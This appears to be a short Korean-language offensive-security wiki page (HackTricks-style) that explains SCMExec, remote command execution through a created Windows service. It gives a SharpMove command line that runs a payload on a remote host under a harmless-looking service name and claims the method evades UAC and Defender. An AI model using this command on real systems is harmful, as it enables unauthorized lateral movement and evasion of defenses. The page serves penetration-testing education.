# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec**는 서비스 제어 관리자(SCM)를 사용하여 원격 시스템에서 명령을 실행하는 기술로, 명령을 실행하는 서비스를 생성합니다. 이 방법은 사용자 계정 컨트롤(UAC) 및 Windows Defender와 같은 일부 보안 제어를 우회할 수 있습니다.

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

{{#include ../../banners/hacktricks-training.md}}
